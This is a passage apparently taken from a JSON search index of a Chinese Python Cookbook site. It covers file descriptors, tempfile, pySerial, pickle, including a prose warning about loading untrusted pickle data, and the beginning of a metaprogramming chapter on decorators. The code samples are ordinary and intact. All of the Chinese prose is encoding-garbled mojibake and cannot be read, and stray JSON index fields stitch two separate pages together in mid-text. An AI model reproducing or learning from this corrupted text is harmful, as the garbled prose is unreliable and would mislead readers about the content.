å¯ä»¥è·¨å¹³å°ï¼Œè¯·ä½¿ç”¨å¥—æ¥å­—å¯¹è±¡çš„ makefile() æ–¹æ³•ã€‚ ä½†æ˜¯å¦‚æœä¸è€ƒè™‘ å¯ç§»æ¤æ€§çš„è¯ï¼Œé‚£ä¸Šé¢çš„è§£å†³æ–¹æ¡ˆä¼šæ¯”ä½¿ç”¨ makefile() æ€§èƒ½æ›´å¥½ä¸€ç‚¹ã€‚ ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§æŠ€æœ¯æ¥æ„é€ ä¸€ä¸ªåˆ«åï¼Œå…è®¸ä»¥ä¸åŒäºç¬¬ä¸€æ¬¡æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼ä½¿ ç”¨å®ƒã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢æ¼”ç¤ºå¦‚ä½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œå®ƒå…è®¸ä½ è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®åˆ°æ ‡å‡†è¾“å‡º (é€šå¸¸ä»¥æ–‡æœ¬æ¨¡å¼æ‰“å¼€): import sys # Create a binary-mode file for stdout bstdout = open(sys.stdout.fileno(), 'wb', closefd=False) bstdout.write(b'Hello World\\n') bstdout.flush() å°½ç®¡å¯ä»¥å°†ä¸€ä¸ªå·²å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦åŒ…è£…æˆä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶å¯¹è±¡ï¼Œä½†æ˜¯è¦æ³¨æ„çš„ æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ–‡ä»¶æ¨¡å¼éƒ½è¢«æ”¯æŒï¼Œ å¹¶ä¸”æŸäº›ç±»å‹çš„æ–‡ä»¶æè¿°ç¬¦å¯èƒ½ä¼šæœ‰å‰¯ä½œç”¨ (ç‰¹åˆ« æ˜¯æ¶‰åŠåˆ°é”™è¯¯å¤„ç†ã€æ–‡ä»¶ç»“å°¾æ¡ä»¶ç­‰ç­‰çš„æ—¶å€™)ã€‚ åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šè¿™ç§è¡Œä¸ºä¹Ÿæ˜¯ä¸ ä¸€æ ·ï¼Œç‰¹åˆ«çš„ï¼Œä¸Šé¢çš„ä¾‹å­éƒ½ä¸èƒ½åœ¨é Unix ç³»ç»Ÿä¸Šè¿è¡Œã€‚ åˆ›å»ºä¸´æ—¶æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ ä½ éœ€è¦åœ¨ç¨‹åºæ‰§è¡Œæ—¶åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¹¶å¸Œæœ›ä½¿ç”¨å®Œä¹‹åå¯ä»¥è‡ªåŠ¨é”€æ¯ æ‰ã€‚ tempfile æ¨¡å—( /docs/åç«¯/python/pythonæ ‡å‡†åº“/tempfile )ä¸­æœ‰å¾ˆå¤šçš„å‡½æ•°å¯ä»¥å®Œæˆè¿™ä»»åŠ¡ã€‚ ä¸ºäº†åˆ›å»ºä¸€ä¸ªåŒ¿åçš„ä¸´æ—¶æ–‡ä»¶ï¼Œ å¯ä»¥ä½¿ç”¨ tempfile.TemporaryFile from tempfile import TemporaryFile with TemporaryFile('w+t') as f: # Read/write to the file f.write('Hello World\\n') f.write('Testing\\n') # Seek back to beginning and read the data f.seek(0) data = f.read() # Temporary file is destroyed æˆ–è€…ï¼Œå¦‚æœä½ å–œæ¬¢ï¼Œä½ è¿˜å¯ä»¥åƒè¿™æ ·ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶: f = TemporaryFile('w+t') # Use the temporary file ... f.close() # File is destroyed TemporaryFile() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶æ¨¡å¼ï¼Œé€šå¸¸æ¥è®²æ–‡æœ¬æ¨¡å¼ä½¿ç”¨ w+t ï¼ŒäºŒè¿› åˆ¶æ¨¡å¼ä½¿ç”¨ w+b ã€‚ è¿™ä¸ªæ¨¡å¼åŒæ—¶æ”¯æŒè¯»å’Œå†™æ“ä½œï¼Œåœ¨è¿™é‡Œæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå› ä¸ºå½“ä½ å…³é—­ æ–‡ä»¶å»æ”¹å˜æ¨¡å¼çš„æ—¶å€™ï¼Œæ–‡ä»¶å®é™…ä¸Šå·²ç»ä¸å­˜åœ¨äº†ã€‚ TemporaryFile() å¦å¤–è¿˜æ”¯æŒè·Ÿå†… ç½®çš„ open() å‡½æ•°ä¸€æ ·çš„å‚æ•°ã€‚æ¯”å¦‚: with TemporaryFile('w+t', encoding='utf-8', errors='ignore') as f: ... åœ¨å¤§å¤šæ•° Unix ç³»ç»Ÿä¸Šï¼Œé€šè¿‡ TemporaryFile() åˆ›å»ºçš„æ–‡ä»¶éƒ½æ˜¯åŒ¿åçš„ï¼Œç”šè‡³è¿ç›® å½•éƒ½æ²¡æœ‰ã€‚ å¦‚æœä½ æƒ³æ‰“ç ´è¿™ä¸ªé™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨ NamedTemporaryFile() æ¥ä»£æ›¿ã€‚æ¯”å¦‚: from tempfile import NamedTemporaryFile with NamedTemporaryFile('w+t') as f: print('filename is:', f.name) ... # File automatically destroyed è¿™é‡Œï¼Œè¢«æ‰“å¼€æ–‡ä»¶çš„ f.name å±æ€§åŒ…å«äº†è¯¥ä¸´æ—¶æ–‡ä»¶çš„æ–‡ä»¶åã€‚ å½“ä½ éœ€è¦å°†æ–‡ä»¶ åä¼ é€’ç»™å…¶ä»–ä»£ç æ¥æ‰“å¼€è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œè¿™ä¸ªå°±å¾ˆæœ‰ç”¨äº†ã€‚ å’Œ TemporaryFile() ä¸€ æ ·ï¼Œç»“æœæ–‡ä»¶å…³é—­æ—¶ä¼šè¢«è‡ªåŠ¨åˆ é™¤æ‰ã€‚ å¦‚æœä½ ä¸æƒ³è¿™ä¹ˆåšï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªå…³é”®å­—å‚æ•° delete=False å³å¯ã€‚ ä¸ºäº†åˆ›å»ºä¸€ä¸ªä¸´æ—¶ç›®å½•ï¼Œå¯ä»¥ä½¿ç”¨ tempfile.TemporaryDirectory() ã€‚æ¯”å¦‚: from tempfile import TemporaryDirectory with TemporaryDirectory() as dirname: print('dirname is:', dirname) # Use the directory ... # Directory and all contents destroyed TemporaryFile() ã€NamedTemporaryFile() å’Œ TemporaryDirectory() å‡½æ•°åº”è¯¥ æ˜¯å¤„ç†ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„æœ€ç®€å•çš„æ–¹å¼äº†ï¼Œ å› ä¸ºå®ƒä»¬ä¼šè‡ªåŠ¨å¤„ç†æ‰€æœ‰çš„åˆ›å»ºå’Œæ¸…ç†æ­¥éª¤ã€‚ åœ¨ä¸€ä¸ªæ›´ä½çš„çº§åˆ«ï¼Œä½ å¯ä»¥ä½¿ç”¨ mkstemp() å’Œ mkdtemp() æ¥åˆ›å»ºä¸´æ—¶æ–‡ä»¶å’Œç›®å½•ã€‚æ¯” å¦‚: >>> import tempfile >>> tempfile.mkstemp() (3, '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-/tmp7fefhv') >>> tempfile.mkdtemp() '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-/tmp5wvcv6' >>> ä½†æ˜¯ï¼Œè¿™äº›å‡½æ•°å¹¶ä¸ä¼šåšè¿›ä¸€æ­¥çš„ç®¡ç†äº†ã€‚ ä¾‹å¦‚ï¼Œå‡½æ•° mkstemp() ä»…ä»…å°±è¿”å›ä¸€ ä¸ªåŸå§‹çš„ OS æ–‡ä»¶æè¿°ç¬¦ï¼Œä½ éœ€è¦è‡ªå·±å°†å®ƒè½¬æ¢ä¸ºä¸€ä¸ªçœŸæ­£çš„æ–‡ä»¶å¯¹è±¡ã€‚ åŒæ ·ä½ è¿˜éœ€è¦ è‡ªå·±æ¸…ç†è¿™äº›æ–‡ä»¶ã€‚ é€šå¸¸æ¥è®²ï¼Œä¸´æ—¶æ–‡ä»¶åœ¨ç³»ç»Ÿé»˜è®¤çš„ä½ç½®è¢«åˆ›å»ºï¼Œæ¯”å¦‚ /var/tmp æˆ–ç±»ä¼¼çš„åœ°æ–¹ã€‚ ä¸º äº†è·å–çœŸå®çš„ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨ tempfile.gettempdir() å‡½æ•°ã€‚æ¯”å¦‚: >>> tempfile.gettempdir() '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-' >>> æ‰€æœ‰å’Œä¸´æ—¶æ–‡ä»¶ç›¸å…³çš„å‡½æ•°éƒ½å…è®¸ä½ é€šè¿‡ä½¿ç”¨å…³é”®å­—å‚æ•° prefix ã€suffix å’Œ dir æ¥è‡ªå®šä¹‰ç›®å½•ä»¥åŠå‘½åè§„åˆ™ã€‚æ¯”å¦‚: >>> f = NamedTemporaryFile(prefix='mytemp', suffix='.txt', dir='/tmp') >>> f.name '/tmp/mytemp8ee899.txt' >>> æœ€åè¿˜æœ‰ä¸€ç‚¹ï¼Œå°½å¯èƒ½ä»¥æœ€å®‰å…¨çš„æ–¹å¼ä½¿ç”¨ tempfile æ¨¡å—æ¥åˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚ åŒ…æ‹¬ ä»…ç»™å½“å‰ç”¨æˆ·æˆæƒè®¿é—®ä»¥åŠåœ¨æ–‡ä»¶åˆ›å»ºè¿‡ç¨‹ä¸­é‡‡å–æªæ–½é¿å…ç«æ€æ¡ä»¶ã€‚è¦æ³¨æ„çš„æ˜¯ä¸ åŒçš„å¹³å°å¯èƒ½ä¼šä¸ä¸€æ ·ã€‚ ä¸ä¸²è¡Œç«¯å£çš„æ•°æ®é€šä¿¡ é€šè¿‡ä¸²è¡Œç«¯å£è¯»å†™æ•°æ®ï¼Œå…¸å‹åœºæ™¯å°±æ˜¯å’Œä¸€äº›ç¡¬ä»¶è®¾å¤‡æ‰“äº¤é“ (æ¯”å¦‚ä¸€ä¸ªæœºå™¨ äººæˆ–ä¼ æ„Ÿå™¨)ã€‚ å°½ç®¡ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨ Python å†…ç½®çš„ I/O æ¨¡å—æ¥å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œä½†å¯¹äºä¸²è¡Œé€šä¿¡ æœ€å¥½çš„é€‰æ‹©æ˜¯ä½¿ç”¨ pySerial åŒ… ã€‚ è¿™ä¸ªåŒ…çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œå…ˆå®‰è£… pySerialï¼Œä½¿ç”¨ç±»ä¼¼ä¸‹ é¢è¿™æ ·çš„ä»£ç å°±èƒ½å¾ˆå®¹æ˜“çš„æ‰“å¼€ä¸€ä¸ªä¸²è¡Œç«¯å£: import serial ser = serial.Serial('/dev/tty.usbmodem641', # Device name varies baudrate=9600, bytesize=8, parity='N', stopbits=1) è®¾å¤‡åå¯¹äºä¸åŒçš„è®¾å¤‡å’Œæ“ä½œç³»ç»Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚ æ¯”å¦‚ï¼Œåœ¨ Windows ç³»ç»Ÿä¸Šï¼Œä½ å¯ ä»¥ä½¿ç”¨ 0, 1 ç­‰è¡¨ç¤ºçš„ä¸€ä¸ªè®¾å¤‡æ¥æ‰“å¼€é€šä¿¡ç«¯å£\"COM0\"å’Œ\"COM1\"ã€‚ ä¸€æ—¦ç«¯å£æ‰“å¼€ï¼Œ é‚£å°±å¯ä»¥ä½¿ç”¨ read()ï¼Œreadline() å’Œ write() å‡½æ•°è¯»å†™æ•°æ®äº†ã€‚ä¾‹å¦‚: ser.write(b'G1 X50 Y50\\r\\n') resp = ser.readline() å°½ç®¡è¡¨é¢ä¸Šçœ‹èµ·æ¥å¾ˆç®€å•ï¼Œå…¶å®ä¸²å£é€šä¿¡æœ‰æ—¶å€™ä¹Ÿæ˜¯æŒºéº»çƒ¦çš„ã€‚ æ¨èä½ ä½¿ç”¨ç¬¬ä¸‰ æ–¹åŒ…å¦‚ pySerial çš„ä¸€ä¸ªåŸå› æ˜¯å®ƒæä¾›äº†å¯¹é«˜çº§ç‰¹æ€§çš„æ”¯æŒ (æ¯”å¦‚è¶…æ—¶ï¼Œæ§åˆ¶æµï¼Œç¼“å†² åŒºåˆ·æ–°ï¼Œæ¡æ‰‹åè®®ç­‰ç­‰)ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ æƒ³å¯ç”¨ RTS-CTS æ¡æ‰‹åè®®ï¼Œä½ åªéœ€è¦ç»™ Serial() ä¼ é€’ä¸€ä¸ª rtscts=True çš„å‚æ•°å³å¯ã€‚ æ—¶åˆ»è®°ä½æ‰€æœ‰æ¶‰åŠåˆ°ä¸²å£çš„ I/O éƒ½æ˜¯äºŒè¿›åˆ¶æ¨¡å¼çš„ã€‚ å› æ­¤ï¼Œç¡®ä¿ä½ çš„ä»£ç ä½¿ç”¨çš„ æ˜¯å­—èŠ‚è€Œä¸æ˜¯æ–‡æœ¬ (æˆ–æœ‰æ—¶å€™æ‰§è¡Œæ–‡æœ¬çš„ç¼–ç /è§£ç æ“ä½œ)ã€‚ å¦å¤–å½“ä½ éœ€è¦åˆ›å»ºäºŒè¿›åˆ¶ç¼– ç çš„æŒ‡ä»¤æˆ–æ•°æ®åŒ…çš„æ—¶å€™ï¼Œstruct æ¨¡å—ä¹Ÿæ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ åºåˆ—åŒ– Python å¯¹è±¡ ä½ éœ€è¦å°†ä¸€ä¸ª Python å¯¹è±¡åºåˆ—åŒ–ä¸ºä¸€ä¸ªå­—èŠ‚æµï¼Œä»¥ä¾¿å°†å®ƒä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ã€å­˜å‚¨ åˆ°æ•°æ®åº“æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“å®ƒã€‚ å¯¹äºåºåˆ—åŒ–æœ€æ™®éçš„åšæ³•å°±æ˜¯ä½¿ç”¨ pickle æ¨¡å—ã€‚ä¸ºäº†å°†ä¸€ä¸ªå¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ ä¸­ï¼Œå¯ä»¥è¿™æ ·åš: import pickle data = ... # Some Python object f = open('somefile', 'wb') pickle.dump(data, f) ä¸ºäº†å°†ä¸€ä¸ªå¯¹è±¡è½¬å‚¨ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ pickle.dumps() s = pickle.dumps(data) ä¸ºäº†ä»å­—èŠ‚æµä¸­æ¢å¤ä¸€ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨ picle.load() æˆ– pickle.loads() å‡½æ•°ã€‚æ¯” å¦‚: # Restore from a file f = open('somefile', 'rb') data = pickle.load(f) # Restore from a string data = pickle.loads(s) å¯¹äºå¤§å¤šæ•°åº”ç”¨ç¨‹åºæ¥è®²ï¼Œdump() å’Œ load() å‡½æ•°çš„ä½¿ç”¨å°±æ˜¯ä½ æœ‰æ•ˆä½¿ç”¨ pickle æ¨¡å—æ‰€éœ€çš„å…¨éƒ¨äº†ã€‚ å®ƒå¯é€‚ç”¨äºç»å¤§éƒ¨åˆ† Python æ•°æ®ç±»å‹å’Œç”¨æˆ·è‡ªå®šä¹‰ç±»çš„å¯¹è±¡å® ä¾‹ã€‚ å¦‚æœä½ ç¢°åˆ°æŸä¸ªåº“å¯ä»¥è®©ä½ åœ¨æ•°æ®åº“ä¸­ä¿å­˜/æ¢å¤ Python å¯¹è±¡æˆ–è€…æ˜¯é€šè¿‡ç½‘ç»œä¼  è¾“å¯¹è±¡çš„è¯ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½è¿™ä¸ªåº“çš„åº•å±‚å°±ä½¿ç”¨äº† pickle æ¨¡å—ã€‚ pickle æ˜¯ä¸€ç§ Python ç‰¹æœ‰çš„è‡ªæè¿°çš„æ•°æ®ç¼–ç ã€‚ é€šè¿‡è‡ªæè¿°ï¼Œè¢«åºåˆ—åŒ–åçš„æ•° æ®åŒ…å«æ¯ä¸ªå¯¹è±¡å¼€å§‹å’Œç»“æŸä»¥åŠå®ƒçš„ç±»å‹ä¿¡æ¯ã€‚ å› æ­¤ï¼Œä½ æ— éœ€æ‹…å¿ƒå¯¹è±¡è®°å½•çš„å®šä¹‰ï¼Œå®ƒ æ€»æ˜¯èƒ½å·¥ä½œã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœè¦å¤„ç†å¤šä¸ªå¯¹è±¡ï¼Œä½ å¯ä»¥è¿™æ ·åš: >>> import pickle >>> f = open('somedata', 'wb') >>> pickle.dump([1, 2, 3, 4], f) >>> pickle.dump('hello', f) >>> pickle.dump({'Apple', 'Pear', 'Banana'}, f) >>> f.close() >>> f = open('somedata', 'rb') >>> pickle.load(f) [1, 2, 3, 4] >>> pickle.load(f) 'hello' >>> pickle.load(f) {'Apple', 'Pear', 'Banana'} >>> ä½ è¿˜èƒ½åºåˆ—åŒ–å‡½æ•°ï¼Œç±»ï¼Œè¿˜æœ‰æ¥å£ï¼Œä½†æ˜¯ç»“æœæ•°æ®ä»…ä»…å°†å®ƒä»¬çš„åç§°ç¼–ç æˆå¯¹åº”çš„ ä»£ç å¯¹è±¡ã€‚: >>> import math >>> import pickle. >>> pickle.dumps(math.cos) b'\\x80\\x03cmath\\ncos\\nq\\x00.' >>> å½“æ•°æ®ååºåˆ—åŒ–å›æ¥çš„æ—¶å€™ï¼Œä¼šå…ˆå‡å®šæ‰€æœ‰çš„æºæ•°æ®æ—¶å¯ç”¨çš„ã€‚æ¨¡å—ã€ç±»å’Œå‡½æ•°ä¼š è‡ªåŠ¨æŒ‰éœ€å¯¼å…¥è¿›æ¥ã€‚ å¯¹äº Python æ•°æ®è¢«ä¸åŒæœºå™¨ä¸Šçš„è§£æå™¨æ‰€å…±äº«çš„åº”ç”¨ç¨‹åºè€Œè¨€ï¼Œ æ•°æ®çš„ä¿å­˜å¯èƒ½ä¼šæœ‰é—®é¢˜ï¼Œå› ä¸ºæ‰€æœ‰çš„æœºå™¨éƒ½å¿…é¡»è®¿é—®åŒä¸€ä¸ªæºä»£ç ã€‚ æ³¨è§£ åƒä¸‡ä¸è¦å¯¹ä¸ä¿¡ä»»çš„æ•°æ®ä½¿ç”¨ pickle.load()ã€‚ pickle åœ¨åŠ è½½æ—¶æœ‰ä¸€ä¸ªå‰¯ä½œç”¨å°±æ˜¯å®ƒä¼šè‡ªåŠ¨åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ„é€ å®ä¾‹å¯¹è±¡ã€‚ ä½†æ˜¯æŸä¸ªåäººå¦‚æœçŸ¥é“ pickle çš„å·¥ä½œåŸç†ï¼Œ ä»–å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®å¯¼è‡´ Python æ‰§è¡Œéšæ„æŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤ã€‚ å› æ­¤ï¼Œä¸€å®šè¦ä¿è¯ pickle åªåœ¨ç›¸äº’ä¹‹é—´å¯ä»¥è®¤è¯å¯¹æ–¹çš„è§£æå™¨çš„å†…éƒ¨ä½¿ç”¨ã€‚ æœ‰äº›ç±»å‹çš„å¯¹è±¡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–çš„ã€‚ è¿™äº›é€šå¸¸æ˜¯é‚£äº›ä¾èµ–å¤–éƒ¨ç³»ç»ŸçŠ¶æ€çš„å¯¹è±¡ï¼Œ æ¯”å¦‚æ‰“å¼€çš„æ–‡ä»¶ï¼Œç½‘ç»œè¿æ¥ï¼Œçº¿ç¨‹ï¼Œè¿›ç¨‹ï¼Œæ ˆå¸§ç­‰ç­‰ã€‚ ç”¨æˆ·è‡ªå®šä¹‰ç±»å¯ä»¥é€šè¿‡æä¾› __getstate__() å’Œ __setstate__() æ–¹æ³•æ¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚ å¦‚æœå®šä¹‰äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œ pickle.dump() å°±ä¼šè°ƒç”¨ __getstate__() è·å–åºåˆ—åŒ–çš„å¯¹è±¡ã€‚ ç±»ä¼¼çš„ï¼Œ __setstate__() åœ¨ååºåˆ—åŒ–æ—¶è¢«è°ƒç”¨ã€‚ ä¸ºäº†æ¼”ç¤ºè¿™ä¸ªå·¥ä½œåŸç†ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåœ¨å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªçº¿ç¨‹ä½†ä» ç„¶å¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±»: # countdown.py import time import threading class Countdown: def __init__(self, n): self.n = n self.thr = threading.Thread(target=self.run) self.thr.daemon = True self.thr.start() def run(self): while self.n > 0: print('T-minus', self.n) self.n -= 1 time.sleep(5) def __getstate__(self): return self.n def __setstate__(self, n): self.__init__(n) è¯•ç€è¿è¡Œä¸‹é¢çš„åºåˆ—åŒ–è¯•éªŒä»£ç : >>> import countdown >>> c = countdown.Countdown(30) >>> T-minus 30 T-minus 29 T-minus 28 ... >>> # After a few moments >>> f = open('cstate.p', 'wb') >>> import pickle >>> pickle.dump(c, f) >>> f.close() ç„¶åé€€å‡º Python è§£æå™¨å¹¶é‡å¯åå†è¯•éªŒä¸‹: >>> f = open('cstate.p', 'rb') >>> pickle.load(f) <countdown.Countdown object at 0x10069e2d0> T-minus 19 T-minus 18 ... ä½ å¯ä»¥çœ‹åˆ°çº¿ç¨‹åˆå¥‡è¿¹èˆ¬çš„é‡ç”Ÿäº†ï¼Œä»ä½ ç¬¬ä¸€æ¬¡åºåˆ—åŒ–å®ƒçš„åœ°æ–¹åˆæ¢å¤è¿‡æ¥ pickle å¯¹äºå¤§å‹çš„æ•°æ®ç»“æ„æ¯”å¦‚ä½¿ç”¨ array æˆ– numpy æ¨¡å—åˆ›å»ºçš„äºŒè¿›åˆ¶æ•°ç»„æ•ˆç‡ å¹¶ä¸æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„ç¼–ç æ–¹å¼ã€‚ å¦‚æœä½ éœ€è¦ç§»åŠ¨å¤§é‡çš„æ•°ç»„æ•°æ®ï¼Œä½ æœ€å¥½æ˜¯å…ˆåœ¨ä¸€ä¸ªæ–‡ ä»¶ä¸­å°†å…¶ä¿å­˜ä¸ºæ•°ç»„æ•°æ®å—æˆ–ä½¿ç”¨æ›´é«˜çº§çš„æ ‡å‡†ç¼–ç æ–¹å¼å¦‚ HDF5 (éœ€è¦ç¬¬ä¸‰æ–¹åº“çš„æ”¯ æŒ)ã€‚ ç”±äº pickle æ˜¯ Python ç‰¹æœ‰çš„å¹¶ä¸”é™„ç€åœ¨æºç ä¸Šï¼Œæ‰€æœ‰å¦‚æœéœ€è¦é•¿æœŸå­˜å‚¨æ•°æ®çš„ æ—¶å€™ä¸åº”è¯¥é€‰ç”¨å®ƒã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæºç å˜åŠ¨äº†ï¼Œä½ æ‰€æœ‰çš„å­˜å‚¨æ•°æ®å¯èƒ½ä¼šè¢«ç ´åå¹¶ä¸”å˜å¾— ä¸å¯è¯»å–ã€‚ å¦ç™½æ¥è®²ï¼Œå¯¹äºåœ¨æ•°æ®åº“å’Œå­˜æ¡£æ–‡ä»¶ä¸­å­˜å‚¨æ•°æ®æ—¶ï¼Œä½ æœ€å¥½ä½¿ç”¨æ›´åŠ æ ‡å‡†çš„ æ•°æ®ç¼–ç æ ¼å¼å¦‚ XMLï¼ŒCSV æˆ– JSONã€‚ è¿™äº›ç¼–ç æ ¼å¼æ›´æ ‡å‡†ï¼Œå¯ä»¥è¢«ä¸åŒçš„è¯­è¨€æ”¯æŒï¼Œ å¹¶ä¸”ä¹Ÿèƒ½å¾ˆå¥½çš„é€‚åº”æºç å˜æ›´ã€‚ æœ€åä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ pickle æœ‰å¤§é‡çš„é…ç½®é€‰é¡¹å’Œä¸€äº›æ£˜æ‰‹çš„é—®é¢˜ã€‚ å¯¹äºæœ€å¸¸è§çš„ ä½¿ç”¨åœºæ™¯ï¼Œä½ ä¸éœ€è¦å»æ‹…å¿ƒè¿™ä¸ªï¼Œä½†æ˜¯å¦‚æœä½ è¦åœ¨ä¸€ä¸ªé‡è¦çš„ç¨‹åºä¸­ä½¿ç”¨ pickle å»åš åºåˆ—åŒ–çš„è¯ï¼Œ æœ€å¥½å»æŸ¥é˜…ä¸€ä¸‹ å®˜æ–¹æ–‡æ¡£ ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-File,-IO.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-File,-IO.html"},{"title":"å…ƒç¼–ç¨‹","text":"è½¯ä»¶å¼€å‘é¢†åŸŸä¸­æœ€ç»å…¸çš„å£å¤´ç¦…å°±æ˜¯\"don't repeat yourself\"ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•æ—¶ å€™å½“ä½ çš„ç¨‹åºä¸­å­˜åœ¨é«˜åº¦é‡å¤ (æˆ–è€…æ˜¯é€šè¿‡å‰ªåˆ‡å¤åˆ¶) çš„ä»£ç æ—¶ï¼Œéƒ½åº”è¯¥æƒ³æƒ³æ˜¯å¦æœ‰æ›´ å¥½çš„è§£å†³æ–¹æ¡ˆã€‚åœ¨ Python å½“ä¸­ï¼Œé€šå¸¸éƒ½å¯ä»¥é€šè¿‡å…ƒç¼–ç¨‹æ¥è§£å†³è¿™ç±»é—®é¢˜ã€‚ç®€è€Œè¨€ä¹‹ï¼Œ å…ƒç¼–ç¨‹å°±æ˜¯å…³äºåˆ›å»ºæ“ä½œæºä»£ç  (æ¯”å¦‚ä¿®æ”¹ã€ç”Ÿæˆæˆ–åŒ…è£…åŸæ¥çš„ä»£ç ) çš„å‡½æ•°å’Œç±»ã€‚ä¸» è¦æŠ€æœ¯æ˜¯ä½¿ç”¨è£…é¥°å™¨ã€ç±»è£…é¥°å™¨å’Œå…ƒç±»ã€‚ä¸è¿‡è¿˜æœ‰ä¸€äº›å…¶ä»–æŠ€æœ¯ï¼ŒåŒ…æ‹¬ç­¾åå¯¹è±¡ã€ä½¿ç”¨ exec() æ‰§è¡Œä»£ç ä»¥åŠå¯¹å†…éƒ¨å‡½æ•°å’Œç±»çš„åå°„æŠ€æœ¯ç­‰ã€‚æœ¬ç« çš„ä¸»è¦ç›®çš„æ˜¯å‘å¤§å®¶ä»‹ç»è¿™ äº›å…ƒç¼–ç¨‹æŠ€æœ¯ï¼Œå¹¶ä¸”ç»™å‡ºå®ä¾‹æ¥æ¼”ç¤ºå®ƒä»¬æ˜¯æ€æ ·å®šåˆ¶åŒ–ä½ çš„æºä»£ç è¡Œä¸ºçš„ã€‚ åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨ ä½ æƒ³åœ¨å‡½æ•°ä¸Šæ·»åŠ ä¸€ä¸ªåŒ…è£…å™¨ï¼Œå¢åŠ é¢å¤–çš„æ“ä½œå¤„ç† (æ¯”å¦‚æ—¥å¿—ã€è®¡æ—¶ç­‰)ã€‚ ä½¿ç”¨è£…é¥°å™¨å‡½æ•° é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå†…ç½®çš„è£…é¥°å™¨æ¯”å¦‚ @staticmethod, @classmethod,@property åŸç† ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ä¸¤ä¸ªä»£ç ç‰‡æ®µæ˜¯ç­‰ä»·çš„: class A: @classmethod def method(cls): pass class B: # Equivalent definition of a class method def method(cls): pass method = classmethod(method) åˆ›å»ºè£…é¥°å™¨æ—¶ä¿ç•™å‡½æ•°å…ƒä¿¡æ¯ ä½ å†™äº†ä¸€ä¸ªè£…é¥°å™¨ä½œç”¨åœ¨æŸä¸ªå‡½æ•°ä¸Šï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°çš„é‡è¦çš„å…ƒä¿¡æ¯æ¯”å¦‚åå­—ã€æ–‡ æ¡£å­—ç¬¦ä¸²ã€æ³¨è§£å’Œå‚æ•°ç­¾åéƒ½ä¸¢å¤±äº†ã€‚ ä½¿ç”¨functools.wraps(fn) ä¿ç•™å…ƒä¿¡æ¯ @wraps æœ‰ä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯å®ƒèƒ½è®©ä½ é€šè¿‡å±æ€§ __wrapped__ ç›´æ¥è®¿é—®è¢«åŒ…è£…å‡½æ•°ã€‚ è§£é™¤ä¸€ä¸ªè£…é¥°å™¨ ä¸€ä¸ªè£…é¥°å™¨å·²ç»ä½œç”¨åœ¨ä¸€ä¸ªå‡½æ•°ä¸Šï¼Œä½ æƒ³æ’¤é”€å®ƒï¼Œç›´æ¥è®¿é—®åŸå§‹çš„æœªåŒ…è£…çš„é‚£ä¸ªå‡½æ•° å‡è®¾è£…é¥°å™¨æ˜¯é€šè¿‡ @wraps (å‚è€ƒ 9.2 å°èŠ‚) æ¥å®ç°çš„ï¼Œé‚£ä¹ˆä½ å¯ä»¥é€šè¿‡è®¿é—® __wrapped__ å±æ€§æ¥è®¿é—®åŸå§‹å‡½æ•°: >>> @somedecorator >>> def add(x, y): ... return x + y ... >>> orig_add = add.__wrapped__ >>> orig_add(3, 4) 7 